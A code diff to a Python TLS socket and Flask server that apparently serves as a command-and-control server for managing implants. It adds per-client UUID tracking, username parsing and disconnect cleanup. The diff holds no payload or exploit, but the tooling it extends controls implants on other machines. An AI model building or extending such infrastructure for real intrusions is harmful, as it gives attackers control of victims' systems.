@@ -1,5 +1,7 @@
 import base64
 import importlib
+import uuid
+
 from dnslib import QTYPE, DNSRecord, RR, PTR
 from urllib.parse import urlparse
 import hashlib
@@ -357,10 +359,11 @@ def checkout_command(imp_id, user_id):
     implant_checkout[imp_id].put(user_id)
 
 
-def handle_client(client_socket):
+def handle_client(client_socket, client_id):
     """
     Handles the client sending and retrieving info
     :param client_socket: The socket object the client uses to connect
+    :param client_id: The ID associated with a specific client
     :return: Uses the client socket to send data, function returns nothing
     """
     try:
@@ -368,7 +371,9 @@ def handle_client(client_socket):
         client_request = client_socket.recv(1024).decode()
 
         # Check what type of message it is first before processing further
-        request_type, *remainder = client_request.split(" ", 1)
+        request_type, uname, *remainder = client_request.split(" ", 2)
+        if result_storage.get(uname, []):
+            client_socket.send("Implant command results pending for you".encode())
 
         match request_type:
             case "AUTH":
@@ -455,7 +460,11 @@ def handle_client(client_socket):
         logger.error(f"Error occurred when trying to receive connection: {e}")
         client_socket.send(f"Error: {e}\n".encode())
     finally:
+        # Clean up and remove the client from active clients
+        logger.info(f"Client {client_id} disconnected")
         client_socket.close()
+        if client_id in active_clients:
+            del active_clients[client_id]
 
 
 def register_routes():
@@ -645,35 +654,47 @@ def start_flask():
     app.run()
 
 
+# Dictionary to store active clients {client_id: client_socket}
+active_clients = {}
+
 def start_server():
     """
-    Start the socket server and the flask server
+    Start the socket server and the Flask server
     Run an infinite loop until cancelled to handle socket requests
     :return: Nothing
     """
-    # Get the initial route list
-    get_routes()
+    # Start the Flask server in a separate thread
     flask_thread = Thread(target=start_flask)
     flask_thread.start()
+
+    # Create and bind the socket
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(('0.0.0.0', 9999))  # Bind to any available interface
     server.listen(5)
+
+    # Configure SSL/TLS context
     server_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     server_context.minimum_version = ssl.TLSVersion.TLSv1_3
     server_context.maximum_version = ssl.TLSVersion.TLSv1_3
     server_context.load_cert_chain(certfile="server.pem")
     server_context.verify_mode = ssl.CERT_NONE
-    secure_socket = server_context.wrap_socket(
-        server,
-        server_side=True,
-    )
+    secure_socket = server_context.wrap_socket(server, server_side=True)
+
     logger.info("TLS socket wrapped and starting on port 9999\n")
-    # register_blueprints("example")
 
     while True:
         client_socket, addr = secure_socket.accept()
-        logger.info(f"Accepted connection from: {addr}")
-        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
+        client_id = str(uuid.uuid4())  # Assign a unique ID to the client
+        logger.info(f"Accepted connection from: {addr}, assigned client ID: {client_id}")
+
+        # Store client information in the active_clients dictionary
+        active_clients[client_id] = {
+            'socket': client_socket,
+            'address': addr,
+        }
+
+        # Start a new thread to handle this client
+        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_id))
         client_handler.start()
 
 
